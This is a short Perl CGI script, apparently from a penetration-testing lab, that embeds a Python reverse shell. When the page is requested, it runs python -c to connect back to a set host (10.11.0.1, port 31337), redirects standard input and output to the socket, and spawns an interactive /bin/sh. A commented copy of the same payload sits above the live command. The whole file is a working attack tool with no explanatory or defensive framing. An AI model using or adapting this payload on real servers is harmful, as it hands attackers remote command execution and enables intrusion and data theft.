#!/usr/bin/perl
use strict;

# To change 
$lport = "31337";
$lhost = "10.11.0.1";

=for comment
import socket, subprocess, os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((" LHOST ", LPORT ))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
=cut

# Executed
print "Content-type: text/html\n\n";
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("`. $lhost .`", ` . $lport . `));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
